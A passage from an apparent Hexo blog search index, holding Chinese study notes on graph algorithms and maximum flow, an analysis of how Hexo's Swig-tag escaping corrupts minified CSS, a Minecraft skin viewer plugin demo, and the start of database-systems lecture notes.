`+`，以此节省时间和空间\n\n对于$i,j,k=1,2,...,n$，定义：如果图$G$中存在一条从结点$i$到结点$j$的所有中间结点都取自集合$\\{1,2,...,k\\}$的路径，则$t^{(k)}_{ij}$为1；否则，$t^{(k)}_{ij}$为0。递归定义如下：\n$$\nt^{(0)}_{ij} =\n\\begin{cases}\n0 \\qquad & i \\neq j \\land (i,j) \\notin E \\\\\n1 \\qquad & i = j \\lor (i,j) \\in E\n\\end{cases} \n$$\n\n对于$k \\geq 1$：\n$$\nt^{(k)}_{ij} = t^{(k-1)}_{ij} \\lor (t^{(k-1)}_{ik} \\land t^{(k-1)}_{kj})\n$$\n```text\nTRANSITIVE-CLOSURE(G)\nn = |G.V|\nlet T(0) = (t(0)_{ij}) be a new n * n matrix\nfor i = 1 to n\n    for j = 1 to n\n        if i == j or (i,j) in G.E\n            t(0)_{ij} = 1\n        else\n            t(0)_{ij} = 0\nfor k = 1 to n\n    let T(k) = (t(k)_{ij}) be a new n * n matrix\n    for i = 1 to n\n        for j = 1 to n\n            t(k)_{ij} = t(k-1)_{ij} || (t(k-1)_{ik} && t(k-1)_{kj})\nreturn T(n)\n```\n#### 用于稀疏图的Johnson算法\n`Johnson` 算法可以在$O(V^2lgV+VE)$时间内找到所有结点对之间的最短路径\n\n`Johnson` 算法使用的技术称为**重新赋予权重**：\n如果图$G=(V,E)$中所有的边权重$w$均为非负值，则可以通过对每一个结点运行一次 `Dijkstra` 算法来找到所有结点对之间的最短路径；如果使用斐波那契堆最小优先队列，该算法的运行时间$O(V^2lgV+VE)$\n如果图$G=(V,E)$包含权重为负值的边，但没有权重为负值的环路，则只要计算出一组新的非负权重值，然后使用同样的方法。新赋予的权重$\\hat{w}$必须满足以下两个重要性质：\n- 对于所有结点对$u,v \\in V$，一条路径$p$是在使用权重函数$w$时从结点$u$到结点$v$的一条最短路径，当且仅当$p$是在使用权重函数$\\hat{w}$时从$u$到$v$的一条最短路径\n- 对于所有的边$(u,v)$，新权重$\\hat{w}(u,v)$为非负值\n\n##### 重新赋予权重来维持最短路径\n给定带权重的有向图$G=(V,E)$，其权重函数为$w:E \\rightarrow \\Reals$，设$h:V \\rightarrow \\Reals$为任意函数，该函数将结点映射到实数上。对于每条边$(u,v) \\in E$，定义：\n$$\n\\hat{w}(u,v)=w(u,v)+h(u)-h(v)\n$$\n\n设$p=\\langle v_0,v_1,...,v_k \\rangle$为从结点$v_0$到结点$v_k$的任意一条理解，那么$p$是在使用权重函数$w$时从结点$v_0$到结点$v_k$的一条最短路径，当且仅当$p$是在使用权重函数$\\hat{w}$时从结点$v_0$到结点$v_k$的一条最短路径，即$w(p)=\\delta(v_0,v_k)$当且仅当$\\hat{w}(p)=\\hat{\\delta}(v_0,v_k)$。而且，图$G$在使用权重函数$w$时不包含权重为负值的环路，当且仅当$p$在使用权重函数$\\hat{w}$也不包括权重为负值的环路。\n\n##### 计算所有结点对之间的最短路径\n`Johnson` 算法在执行过程中需要使用 `Bellman-Ford` 算法和 `Dijkstra` 算法作为子程序来计算所有结点对之间的最短路径。该算算假定所有的边都保持在邻接链表里，其返回一个$|V| \\times |V|$的矩阵$D=d_{ij},d_{ij}=\\delta(i,j)$，或者报告输入图包含一个权重为负值的环路：\n```text\nJOHNSON(G, w)\ncompute G', where G'.V = G.V ∪ {s},\n    G'.E = G.E ∪ {(s,v):v in G.V} \n    and w(s,v) = 0 for all v in G.V \nif BELLMAN-FOLD(G', w, s) == FALSE\n    print \"the input graph contains a negative-weight cycle\"\nelse\n    for each vertex v in G'.V\n        set h(v) to the value of δ(s, v) computed by the Bellman-Ford algorithm\n    for each edge(u, v) in G'.E\n        \\hat_w(u,v) = w(u,v) + h(u) - h(v)\n    let D = (d_{uv}) be a new n * n matrix\n    for each vertex u in G.V\n        run DIJKSTRA(G, \\hat_w, u) to compute \\hat_δ(u, v) for all v in G.V\n        for each vertex v in G.V\n        d_{uv} = \\hat_δ(u, v) + h(v) - h(u)\n    return D\n```\n如果使用斐波那契堆来实现 `Dijkstra` 算法里的最小优先队列，则 `Johnson` 算法的运行时间为$O(V^2lgV+VE)$，使用更简单的二叉最小堆实现则运行时间为$O(VElgV)$\n### 最大流\n#### 流网络\n##### 流网络和流\n流网络$G=(V,E)$是一个有向图，图中每条边$(u,v) \\in E$有一个非负的**容量值**$c(u,v) \\geq 0$\n如果边集合$E$包含一条边$(u,v)$，则图中不存在反方向的边$(v,u)$\n在图中不允许自循环，对于每个结点$v \\in V$，流网络都包含一条路径$s \\leadsto v \\leadsto t$\n流网络图是连通的，且由于除源结点外的每个结点都至少有一条进入的边，有$|E| \\geq |V|-1$\n\n![flowNetwork](https://d-sketon.top/img/clrs-book/14.png)\n\n流的形式化定义：\n设$G=(V,E)$为一个流网络，其容量函数为$c$。设$s$为网络的源结点，$t$为汇点。$G$中的流是一个实值函数$f$：$V \\times V \\rightarrow \\Reals$，满足下面的两条性质：\n- **容量限制**：对于所有的结点$u，v \\in V$，要求$0 \\leq f(u,v) \\leq c(u,v)$\n- **流量守恒**：对于所有的结点$u \\in V- \\{s,t\\}$，要求：\n$$\\sum_{v\\in V}f(u,v) = \\sum_{v\\in V}f(v,u) $$\n\n当$(u,v) \\notin E$时，从结点$u$到结点$v$之间没有流，因此$f(u,v)=0$\n\n一个流$f$的值$|f|$定义如下：\n$$|f|=\\sum_{v \\in V}f(s,v)-\\sum_{v \\in V}f(v,s)$$\n#### Ford-Fulkerson方法\n`Ford-Fulkerson` 方法循环增加流的值。在开始的时候，对于所有的结点$u,v \\in V$，$f(u,v)=0$，给出的初始流值为0。在每次迭代中，我们将图$G$的流值进行增加，方法就是在一个关联的**残存网络**$G_f$中寻找一条**增广路径**。重复对流进行这一过程，直到残存网络中不再增加增广路径为止：\n```text\nFORD-FULKERSON-METHOD(G, s, t)\ninitialize flow f to 0\nwhile there exists an augmenting path p in the residual network Gf\n    augment flow f along p\nreturn f\n```\n##### 残存网络\n残存网络由那些仍有空间对流量进行调整的边构成。流网络的一条边可以允许的额外流量等于该边的容量减去该边上的流量：\n- 如果该差值为正，则将该条边置于图$G_f$中，并将其残存容量设置为$c_f(u,v)=c(u,v)-f(u,v)$；同时将边$(v,u)$加入到图$G_f$中，并将其残存容量设置为$c_f(v,u)=f(u,v)$\n- 如果边$(u,v)$的流量等于其容量，则其$c_f(u,v)=0$，该条边将不属于图$G_f$\n\n形式化地，假定有一个流网络$G=(V,E)$，其源结点为$s$，汇点为$t$。设$f$为图$G$中的一个流，考虑结点对$u,v \\in V$，定义**残存容量**$c_f(u,v)$：\n$$\nc_f(u,v) =\n\\begin{cases}\nc(u,v)-f(u,v) \\qquad & (u,v) \\in E\\\\\nf(v,u) \\qquad & (v,u) \\in E\\\\\n0 \\qquad & other\n\\end{cases} \n$$\n\n给定一个流网络$G=(V,E)$和一个流$f$，则由$f$所诱导的图$G$的**残存网络**为$G_f=(V,E_f)$，其中：\n$$\nE_f = \\{(u,v) \\in V \\times V:c_f(u,v)>0\\}\n$$\n\n如果$f$是$G$的一个流，$f'$是对应的残存网络$G_f$中的一个流，定义$f \\uparrow f'$为流$f'$对流$f$的递增，它是一个从$V \\times V \\rightarrow \\Reals$的函数，其定义如下：\n$$\n(f \\uparrow f')(u,v) =\n\\begin{cases}\nf(u,v)+f'(u,v)-f'(v,u) \\qquad & (u,v) \\in E\\\\\n0 \\qquad & other\n\\end{cases} \n$$\n##### 增广路径\n给定流网络$G=(V,E)$和流$f$，增广路径$p$是残存网络$G_f$中一条从源结点$s$到汇点$t$的简单路径\n我们称在一条增广路径$p$上能够为每条边增加的流量的最大值为路径$p$的**残存容量**，该容量由下面的表达式给出：\n$$\nc_f(p)=min\\{c_f(u,v):(u,v)\\text{属于路径}p\\}\n$$\n\n##### 流网络的切割\n流网络$G=(V,E)$中的一个切割$(S,T)$将结点集合$V$划分为$S$和$T=V-S$两个集合，使得$s \\in S$，$t \\in T$。若$f$是一个流，则定义横跨切割$(S,T)$的**净流量**$f(S,T)$如下：\n$$\nf(S,T)=\\sum_{u\\in S}\\sum_{v \\in T}f(u,v)-\\sum_{u\\in S}\\sum_{v \\in T}f(v,u)\n$$\n\n切割$(S,T)$的**容量**：\n$$\nc(S,T)=\\sum_{u\\in S}\\sum_{v \\in T}c(u,v)\n$$\n\n一个网络的最小切割是整个网络中容量最小的切割\n\n设$f$为流网络$G$的一个流，该流网络的源结点为$s$，汇点为$t$，设$(S,T)$为流网络$G$的任意切割，则横跨切割$(S,T)$的净流量为$f(S,T)=|f|$\n流网络$G$中任意流$f$的值不能超过$G$的任意切割的容量\n设$f$为流网络$G=(V,E)$中的一个流，该流网络的源结点为$s$，汇点为$t$，则下面的条件是等价的：\n- $f$是$G$的一个最大流\n- 残存网络$G_f$不包括任何增广路径\n- $|f|=c(S,T)$，其中$(S,T)$是流网络$G$的某个切割\n##### 基本的Ford-Fulkerson算法\n在 `Ford-Fulkerson` 方法的每次迭代中，寻找某条增广路径$p$，然后使用$p$来对流$f$进行修改（增加）。通过为每条边$(u,v) \\in E$更新流属性$(u,v).f$来计算流网络$G=(V,E)$中的最大流：\n```text\nFORD-FULKERSON(G, s, t)\nfor each edge(u,v) in G.E\n    (u,v).f = 0\nwhile there exists a path p from s to t in the residual network Gf\n    cf(p) = min{cf(u,v):(u,v)is in p}\n    for each edge(u,v) in p\n        if (u,v) in E\n            (u,v).f = (u,v).f + cf(p)\n        else\n            (u,v).f = (u,v).f - cf(p)\n```\n如果$f^*$表示转换后网络中的一个最大流，则 `Ford-Fulkerson` 算法的运行时间为$O(E|f^*|)$\n##### Edmonds-Karp算法\n通过在算法第3行寻找增广路径的操作中使用广度优先搜索来改善 `Ford-Fulkerson` 算法的效率：\n在残存网络中选择的增广路径是一条从源结点$s$到汇点$t$的最短路径，其中每条边的权重为单位距离\n`Edmonds-Karp` 算法的运行时间为$O(VE^2)$","tags":["算法"],"categories":["计软杂谈","学习笔记"]},{"title":"Hexo源码分析（一）issue #4976的研究","url":"/reimu-lighthouse/20220912/hexo-source1/","content":"\n> 由于Hexo中使用了`bluebird`这个Promise库，会导致代码较难理解\n> 本文会省略一些和issue无关的代码\n\n最近看到了Hexo的[issue #4976](https://github.com/hexojs/hexo/issues/4976)，其中提到了大文件的CSS在生成的过程中可能会丢失部分代码。本人感觉这个问题非常有意思，于是自己也尝试了一下大文件的CSS，没想到也成功复现了这个问题。\n先说结论：问题应该出现在`post.js`中的`escapeAllSwigTags()`函数。由于压缩过的CSS中可能出现诸如{% raw %}{#main {% endraw %} 这样的语句，而这样的语句会在这个函数中被当成swig模板进行处理，导致了代码的丢失。\n解决方法：在`_config.yml`的`skip_render`中添加CSS的相对路径\n以下为排查的过程和部分源码的分析：\n## hexo-cli\nhexo中所输入的命令实际运行的是`hexo/bin/hexo`文件：\n```js\n#!/usr/bin/env node\nrequire('hexo-cli')();\n```\nhexo文件中直接导入`hexo-cli`模块，查看`hexo-cli`入口点：\n```json\n{\n  \"main\": \"lib/hexo\"\n}\n```\n即入口点为`hexo/node_modules/hexo-cli/lib/hexo.js`，其模块导出：\n```js\nmodule.exports = entry;\n```\n查看`entry()`函数：\n其输入两个参数`cwd`和`args`。在该函数中调用了`loadModule()`函数，并将其返回结果赋值给`hexo`，接着调用其`init()`函数\n```js\nfunction entry(cwd = process.cwd(), args) {\n  //...\n  //此时的hexo变量不是真正的Hexo对象\n  let hexo = new Context(cwd, args);\n\n  //...\n\n  return findPkg(cwd, args).then(path => {\n    if (!path) return;\n\n    hexo.base_dir = path;\n\n    return loadModule(path, args).catch(err => {\n      //...\n    });\n  }).then(mod => {\n    //将loadModule返回的Hexo对象赋值给hexo\n    if (mod) hexo = mod;\n    //引入console模块，其中包含部分命令如init，help和version\n    require('./console')(hexo);\n    //调用其init()函数\n    return hexo.init();\n  }).then(() => {\n    //...\n  }).catch(handleError);\n}\n```\n查看`loadModule()`函数，在该函数中创建Hexo对象并返回：\n```js\nfunction loadModule(path, args) {\n  return Promise.try(() => {\n    const modulePath = resolve.sync('hexo', { basedir: path });\n    const Hexo = require(modulePath);\n    //创建Hexo对象，args代表命令参数\n    return new Hexo(path, args);\n  });\n}\n```\n\n> 总结：hexo-cli中创建Hexo对象，并调用其init()函数\n\n## hexo初始化\n查看`hexo`入口点：\n```json\n{\n  \"main\": \"lib/hexo\"\n}\n```\n即入口点为`hexo/lib/hexo/index.js`，其模块导出：\n```js\nmodule.exports = Hexo;\n```\n先查看Hexo类的构造函数，在该函数中主要为属性赋值，初始化配置文件；同时初始化数据库，绑定查询方法\n```js\nconstructor(base = process.cwd(), args = {}) {\n  super();\n  //初始化各种路径变量\n  this.base_dir = base + sep;\n  this.public_dir = join(base, 'public') + sep;\n  this.source_dir = join(base, 'source') + sep;\n  this.plugin_dir = join(base, 'node_modules') + sep;\n  this.script_dir = join(base, 'scripts') + sep;\n  this.scaffold_dir = join(base, 'scaffolds') + sep;\n  this.theme_dir = join(base, 'themes', defaultConfig.theme) + sep;\n  this.theme_script_dir = join(this.theme_dir, 'scripts') + sep;\n  //初始化环境变量\n  this.env = {\n    args,\n    debug: Boolean(args.debug),\n    safe: Boolean(args.safe),\n    silent: Boolean(args.silent),\n    env: process.env.NODE_ENV || 'development',\n    version,\n    cmd: args._ ? args._[0] : '',\n    init: false\n  };\n  //初始化各类extend模块\n  this.extend = {\n    console: new Console(),\n    deployer: new Deployer(),\n    filter: new Filter(),\n    generator: new Generator(),\n    helper: new Helper(),\n    injector: new Injector(),\n    migrator: new Migrator(),\n    processor: new Processor(),\n    renderer: new Renderer(),\n    tag: new Tag()\n  };\n  //其余的初始化\n  this.config = { ...defaultConfig };\n\n  this.log = logger(this.env);\n\n  this.render = new Render(this);\n\n  this.route = new Router();\n\n  this.post = new Post(this);\n\n  this.scaffold = new Scaffold(this);\n\n  this._dbLoaded = false;\n\n  this._isGenerating = false;\n\n  // If `output` is provided, use that as the\n  // root for saving the db. Otherwise default to `base`.\n  const dbPath = args.output || base;\n  //...\n  //初始化数据库，用于临时存储需要生成和处理的原始文件\n  this.database = new Database({\n    version: dbVersion,\n    path: join(dbPath, 'db.json')\n  });\n  //初始化配置文件\n  const mcp = multiConfigPath(this);\n\n  this.config_path = args.config ? mcp(base, args.config, args.output)\n    : join(base, '_config.yml');\n  //注册数据库中的模型（相当于表），模型中具体的schema定义可以查阅hexo/lib/models中对应的模块\n  registerModels(this);\n\n  this.source = new Source(this);\n  this.theme = new Theme(this);\n  this.locals = new Locals(this);\n  //绑定local的查询方法\n  this._bindLocals();\n}\n```\n由于在`hexo-cli`调用了Hexo类中的`init()`函数，查看该函数：\n```js\ninit() {\n  //...\n\n  //加载外部plugins\n  require('../plugins/console')(this);  //控制台插件，用于处理输入的指令\n  require('../plugins/filter')(this);   //过滤器插件\n  require('../plugins/generator')(this);//生成器插件，用于生成转换后的文件\n  require('../plugins/helper')(this);\n  require('../plugins/injector')(this);\n  require('../plugins/processor')(this);//处理器插件，用于文件生成前的预处理\n  require('../plugins/renderer')(this);\n  require('../plugins/tag')(this);\n\n  //加载配置\n  return Promise.each([\n    'update_package', // Update package.json\n    'load_config', // Load config\n    'load_theme_config', // Load alternate theme config\n    'load_plugins' // Load external plugins & scripts\n  ], name => require(`./${name}`)(this)).then(() => this.execFilter('after_init', null, { context: this })).then(() => {\n    // Ready to go!\n    this.emit('ready');\n  });\n}\n```\n至此，Hexo初始化完成，可以开始执行用户输入的指令\n## generate\n`hexo/lib/plugins/console`用于处理用户输入的指令\n`hexo/lib/plugins/console/index.js`是该模块的入口，该模块用于向对应的extend中注册模块，以下以generate命令为例：\n```js\nmodule.exports = function(ctx) {\n  const { console } = ctx.extend;\n  //...\n  //注册generate相关处理模块，require('./generate')\n  console.register('generate', 'Generate static files.', {\n    options: [\n      {name: '-d, --deploy', desc: 'Deploy after generated'},\n      {name: '-f, --force', desc: 'Force regenerate'},\n      {name: '-w, --watch', desc: 'Watch file changes'},\n      {name: '-b, --bail', desc: 'Raise an error if any unhandled exception is thrown during generation'},\n      {name: '-c, --concurrency', desc: 'Maximum number of files to be generated in parallel. Default is infinity'}\n    ]\n  }, require('./generate'));\n\n  //...\n};\n```\n查看同目录下的`generate.js`模块：\n其创建了Generater对象，并调用了`this.load()`函数，由于this就是Hexo对象，所以相当于调用了Hexo对象中的`load()`函数\n```js\nfunction generateConsole(args = {}) {\n  const generator = new Generater(this, args);\n  //如果指令中存在 -w 或 --watch 则会执行以下代码\n  if (generator.watch) {\n    return generator.execWatch();\n  }\n  //先调用load()函数加载需要生成的文件，之后才进行生成操作\n  return this.load().then(() => generator.firstGenerate()).then(() => {\n    //如果指令中存在 -d 或 --deploy，则会执行以下代码\n    if (generator.deploy) {\n      return generator.execDeploy();\n    }\n  });\n}\n\nmodule.exports = generateConsole;\n```\n查看Hexo类中的`load()`函数：\n该函数首先调用`load_database.js`中的`loadDatabase`模块，先检查是否在根目录下存在`db.json`数据库文件，如果有则进行读取，否则直接返回\n由于hexo将需要处理的文件分成了`source`（\\source目录下的文件）和`theme`（\\themes目录下的文件），所以分别需要对这两个部分执行`process()`函数进行预处理\n在异步调用结束后，需要生成的文件已经被存入了hexo对象中的`database`属性中，等待被生成。此时执行`mergeCtxThemeConfig()`函数进行配置的融合，并调用`_generate()`函数用于执行生成前和生成后的过滤器（filter）\n由于CSS文件位于`\\source`目录下，所以CSS文件会在`this.source.process()`中被处理\n```js\nload(callback) {\n  //检查是否在根目录下存在`db.json`数据库文件，如果有则进行读取，否则直接返回\n  return loadDatabase(this).then(() => {\n    this.log.info('Start processing');\n    //进行预处理，将文件读入数据库中\n    return Promise.all([\n      this.source.process(),\n      this.theme.process()\n    ]);\n  }).then(() => {\n    //融合配置文件\n    mergeCtxThemeConfig(this);\n    //执行生成前和生成后的过滤器（filter）\n    return this._generate({ cache: false });\n  }).asCallback(callback);\n}\n```\n由于issue中所提到的CSS文件属于soruce，所以只需要研究`this.source.process()`\n## processor\n查看`hexo/lib/box/index.js`中的`process()`函数：\n重点在于最后的return语句，通过`_readDir()`函数读取文件到数据库中，再使用过滤器处理被删除的文件。而issue中提到的问题正是在将文件读取到数据库中发生的\n```js\nprocess(callback) {\n  const { base, Cache, context: ctx } = this;\n\n  return stat(base).then(stats => {\n    //...\n\n    // Handle deleted files\n    return this._readDir(base)\n      .then(files => cacheFiles.filter(path => !files.includes(path)))\n      .map(path => this._processFile(File.TYPE_DELETE, path));\n  }).catch(err => {\n    //...\n  }).asCallback(callback);\n}\n```\n查看同文件下`_readDir()`函数：\n函数比较简单，即递归读取特定目录下所有文件，检查其状态并使用`_processFile()`函数进行处理\n读取文件本身不存在问题，问题出在对读取出来数据的处理上\n```js\n_readDir(base, prefix = '') {\n  const results = [];\n  return readDirWalker(base, results, this.ignore, prefix)\n    .return(results)\n    .map(path => this._checkFileStatus(path))\n    .map(file => this._processFile(file.type, file.path).return(file.path));\n}\n```\n查看同文件下`_processFile`函数：\n`bluebird`的使用使得代码较难理解，大意就是对于每个`path`，判断其是否匹配`processor`中的`pattern`。如果匹配，则执行`processor`中的`process()`函数，并将结果返回\n```js\n_processFile(type, path) {\n\n  //...\n  //对this.processor中的每个processor都进行如下操作\n  return Promise.reduce(this.processors, (count, processor) => {\n    //判断path是否匹配processor中的pattern\n    const params = processor.pattern.match(path);\n    //如果不匹配，则直接返回\n    if (!params) return count;\n    const file = new File({\n      source: join(base, path),\n      path,\n      params,\n      type\n    });\n    //否则，执行processor中的process方法，并将结果返回\n    return Reflect.apply(Promise.method(processor.process), ctx, [file])\n  }, 0).catch(err => {\n    ctx.log.error({ err }, 'Process failed: %s', magenta(path));\n  }).finally(() => {\n    this._processingFiles[path] = false;\n  }).thenReturn(path);\n}\n```\n注意，这里的`this`是hexo对象中的`source`而非`theme`，所以查看`hexo/lib/hexo/source.js`：\n```js\nclass Source extends Box {\n  constructor(ctx) {\n    super(ctx, ctx.source_dir);\n\n    this.processors = ctx.extend.processor.list();\n  }\n}\n```\n继续查看`hexo/lib/extend/processor.js`：\n可以知道最终processors中的处理器就是那些初始化时被注册的处理器（和console一样）\n```js\nclass Processor {\n  constructor() {\n    this.store = [];\n  }\n\n  list() {\n    return this.store;\n  }\n\n  register(pattern, fn) {\n      //...\n    this.store.push({\n      pattern: new Pattern(pattern),\n      process: fn\n    });\n  }\n}\n```\n继续查看`hexo/lib/plugins/processor/index.js`：\n可以知道`asset`、`data`和`post`三个处理器被成功注册，而CSS文件是归属于`asset`进行处理的\n```js\nmodule.exports = ctx => {\n  const { processor } = ctx.extend;\n\n  function register(name) {\n    const obj = require(`./${name}`)(ctx);\n    processor.register(obj.pattern, obj.process);\n  }\n\n  register('asset');\n  register('data');\n  register('post');\n};\n```\n继续查看`hexo/lib/plugins/processor/asset.js`：\nCSS文件的`renderable`是`true`，所以会进入`processPage()`函数中\n```js\nmodule.exports = ctx => {\n  return {\n    pattern: new Pattern(path => {\n      if (isExcludedFile(path, ctx.config)) return;\n\n      return {\n        //如果这里_config.yml中设置了skip_render，则这里的renderable会变为false，也就不会参与之后的转义了\n        renderable: ctx.render.isRenderable(path) && !isMatch(path, ctx.config.skip_render)\n      };\n    }),\n\n    process: function assetProcessor(file) {\n      if (file.params.renderable) {\n        return processPage(ctx, file);\n      }\n\n      return processAsset(ctx, file);\n    }\n  };\n};\n```\n继续查看`processPage()`函数：\n在该函数中，主要是读取对应文件，进行一定的处理后将结果存入数据库的`Page`模型中\n```js\nfunction processPage(ctx, file) {\n  const Page = ctx.model('Page');\n  const { path } = file;\n  const doc = Page.findOne({source: path});\n  const { config } = ctx;\n  const { timezone: timezoneCfg } = config;\n\n  //...\n\n  return Promise.all([\n    file.stat(),\n    //读取文件\n    file.read()\n  ]).spread((stats, content) => {\n    const data = yfm(content);\n    const output = ctx.render.getOutput(path);\n\n    data.source = path;\n    //raw是读取的原始数据\n    data.raw = content;\n\n    data.date = toDate(data.date);\n    //一系列处理\n    //...\n    //存入数据库中\n    return Page.insert(data);\n  });\n}\n```\n## filter\n`process()`函数已经完成，此时回到`load()`函数中：\n开始执行`_generate()`函数\n```js\nload(callback) {\n  //检查是否在根目录下存在`db.json`数据库文件，如果有则进行读取，否则直接返回\n  return loadDatabase(this).then(() => {\n    this.log.info('Start processing');\n    //进行预处理，将文件读入数据库中\n    return Promise.all([\n      this.source.process(),\n      this.theme.process()\n    ]);\n  }).then(() => {\n    //融合配置文件\n    mergeCtxThemeConfig(this);\n    //执行生成前和生成后的过滤器（filter）\n    return this._generate({ cache: false });\n  }).asCallback(callback);\n}\n```\n查看同目录下的`_generate()`函数：\n基本上就是先运行`before_generate`过滤器，接着运行`_runGenerators`调用生成器进行生成，最后运行`after_generate`过滤器\n```js\n_generate(options = {}) {\n  //...\n\n  this.emit('generateBefore');\n\n  //运行before_generate过滤器\n  return this.execFilter('before_generate', this.locals.get('data'), { context: this })\n  //运行_runGenerators调用生成器进行生成\n    .then(() => this._routerReflesh(this._runGenerators(), useCache)).then(() => {\n    this.emit('generateAfter');\n\n    //运行after_generate过滤器\n    return this.execFilter('after_generate', null, { context: this });\n    }).finally(() => {\n    this._isGenerating = false;\n    });\n}\n```\n问题出现在`before_generate`过滤器之中，查看`hexo/lib/plugins/filter/before_generate/render_post.js`：\n在该过滤器中，对于`Post`模型和`Page`模型分别调用`render()`函数对post进行处理(如转义)\n```js\nfunction renderPostFilter(data) {\n  const renderPosts = model => {\n    //获得所有content为空的post\n    const posts = model.toArray().filter(post => post.content == null);\n\n    return Promise.map(posts, post => {\n      //先赋值为_content\n      post.content = post._content;\n      post.site = {data};\n      //调用render()函数对post进行处理(如转义)\n      return this.post.render(post.full_source, post).then(() => \n      //保存回数据库\n      post.save());\n    });\n  };\n\n  return Promise.all([\n  renderPosts(this.model('Post')),\n  renderPosts(this.model('Page'))\n  ]);\n}\n```\n查看`hexo/lib/hexo/post.js`中的`render()`函数：\n在该函数中，首先运行`before_post_render`过滤器，接着在对文件进行转义操作后使用渲染器对markdown等进行渲染，最后运行`after_post_render`过滤器\n问题就出在`escapeAllSwigTags()`函数中。由于压缩过的CSS中可能出现诸如{% raw %}{#main{% endraw %}这样的语句，而这样的语句会在这个函数中被当成swig模板进行处理，导致文件丢失部分代码\n```js\nrender(source, data = {}, callback) {\n  const ctx = this.context;\n  const { config } = ctx;\n  const { tag } = ctx.extend;\n  const ext = data.engine || (source ? extname(source) : '');\n\n  let promise;\n  \n  //...\n\n  return promise.then(content => {\n    data.content = content;\n    //运行before_post_render过滤器\n    return ctx.execFilter('before_post_render', data, { context: ctx });\n  }).then(() => {\n    data.content = cacheObj.escapeCodeBlocks(data.content);\n    // Escape all Nunjucks/Swig tags\n    if (disableNunjucks === false) {\n      //问题出在这句话\n      //CSS不需要转义swig模板!!!\n      data.content = cacheObj.escapeAllSwigTags(data.content);\n    }\n\n    // 使用渲染器对markdown等进行渲染\n    //...\n  }).then(content => {\n    data.content = cacheObj.restoreCodeBlocks(content);\n\n    //运行after_post_render过滤器\n    return ctx.execFilter('after_post_render', data, { context: ctx });\n  }).asCallback(callback);\n}\n```","tags":["Hexo"],"categories":["计软杂谈","hexo"]},{"title":"hexo-minecraft-skin-viewer插件Demo","url":"/reimu-lighthouse/20220902/hexo-mcskin-demo/","content":"A hexo plugin to display minecraft skin by skinview3d.\n使用skinview3d展示minecraft皮肤3D模型\n## Install \n\n```bash\n$ npm install hexo-minecraft-skin-viewer --save\n```\n\n## Usage\n```text\n{% raw %}\n{% mcskin name ATouuuu true true 100 200 %}\n{% mcskin url https://mineskin.eu/skin/D_Sketon true true %}\n{% endraw %}\n```\n\n第一个参数代表选择MINECRAFT用户名还是皮肤地址\n参数范围：name/url（必填）\nThe 1st parameter represents whether to select MINECRAFT username or skin url\nparameter range: name/url (required)\n\n第二个参数代表MINECRAFT用户名或皮肤地址（必填）\nThe 2nd parameter represents MINECRAFT username or skin url (required)\n\n第三个参数代表是否开启自动旋转（选填，默认true）\nThe 3rd parameter represents whether to turn on automatic rotation (optional,default true)\n\n第四个参数代表是否开启模型动画（选填，默认false）\nThe 4th parameter represents whether to turn on model animation (optional,default false)\n\n第五个参数代表模型宽度（选填，默认300）\nThe 5th parameter represents the width of the model (optional,default 300)\n\n第五个参数代表模型高度（选填，默认400）\nThe 6th parameter represents the height of the model (optional,default 400)\n\n## Example\n```text\n{% raw %}\n{% mcskin name ATouuuu true true 100 200 %}\n{% endraw %}\n```\n{% mcskin name ATouuuu true true 100 200 %}\n```text\n{% raw %}\n{% mcskin url https://mineskin.eu/skin/D_Sketon true true %}\n{% endraw %}\n```\n{% mcskin url https://mineskin.eu/skin/D_Sketon true true %}","tags":["hexo"],"categories":["计软杂谈"]},{"title":"数据库系统概念 学习笔记","url":"/reimu-lighthouse/20220816/db-book-note/","content":"## 引言\n\n### 数据库-DataBase\n\n- 一个互相关联的数据的集合\n- 大多数计算机应用程序的核心组件\n\n### 数据库管理系统-DBMS（DataBase Management System）\n\n- 一个互相关联的数据集合\n- 访问这些数据的一组程序\n- 提供了一种既方便又高效的存储和检索数据库信息的方法\n- 由多个用户和应用程序访问\n\n### 数据模型\n\n- 关系模型\n    - 用表的集合来表述数据和数据间的联系\n- 实体-联系（E-R）模型\n    - 使用称作实体的基本对象的集合，以及这些对象间的关系\n- 半结构化数据模型\n    - 允许在其数据定义中某些相同类型的数据项含有不同的属性集\n- 基于对象的数据模型\n    - 对关系模型进行扩展，增加了封装、方法和对象标识符等概念\n- 键值对模型，图模型，文件模型等等......\n\n### 数据抽象\n\n- 物理层\n    - 描述数据是怎样**存储**的\n- 逻辑层\n    - 描述数据库中存储**什么**数据以及这些数据建存在什么联系\n    - 通过少量相对**简单**的结构描述了整个数据库\n- 视图层\n    - 只描述整个数据库的**某个部分**\n\n### 实例（instance）和模式（schema）\n\n类似于编程语言中的类型和变量\n\n- 逻辑模式\n    - 数据库的整体逻辑结构\n    - 类似于程序中变量的类型信息\n- 物理模式\n    - 数据库的整体物理结构\n- 实例\n    - 数据库的实际内容\n    - 类似于变量的值\n\n### 数据库语言\n\n#### 数据定义语言（DDL）\n\n用于定义数据库模式的实现细节\n- **数据字典（data dictionary）** 包含元数据\n    - 数据库模式\n    - 完整性约束\n    - 授权\n\n#### 数据操纵语言（DML）\n\n访问和更新数据的语言（**查询语言**）\n- 过程化的 DML\n    - 要求用户指定需要什么数据以及**如何**获得这些数据\n        - 关系代数（relational algebra）\n- 声明式的（非过程化的）DML\n    - 要求用户指定需要**什么**数据，而不必指明如何获得这些数据\n类似于编程语言中的类型和变量\n        - 关系演算（relational calculus）\n        - SQL\n\n### SQL 查询语言\n\n- SQL 查询语言是非过程化的\n- SQL 不是图灵完备的\n- 通常嵌入在一些高级语言中\n- 应用程序通常通过以下方式访问数据库：\n    - 允许嵌入式 SQL 的语言扩展\n    - 允许将 SQL 查询发送到数据库的应用程序接口（例如 ODBC/JDBC）\n\n### 数据库设计\n\n- 逻辑设计 \\- 决定数据库模式\n    - 找到“好”的模式\n    - 业务决策—应该在数据库中记录哪些属性\n    - 计算机科学决策——应该拥有哪些关系模式以及属性应该如何在各种关系模式之间分布\n- 物理设计 \\- 决定数据库的物理布局\n\n### 数据库引擎\n\n- 数据库系统被划分为多个模块，每个模块完成整个系统的一个功能\n- 数据库系统的主要组成部分\n    - 存储管理器\n    - 查询处理器\n    - 事务管理\n\n### 存储管理器\n\n- 与 OS 文件管理器进行交互\n- 负责数据库中数据的存储、检索和更新\n- 存储管理器部件包括：\n    - 权限和完整性管理器\n           - 检测时候满足完整性约束，并检查试图访问数据的用户权限\n    - 事务管理器\n        - 保证即使系统发生了故障，数据库也保持在一致的状态\n    - 文件管理器\n        - 管理磁盘存储空间的分配和用于表示磁盘上所存储信息的数据结构\n    - 缓冲区管理器\n        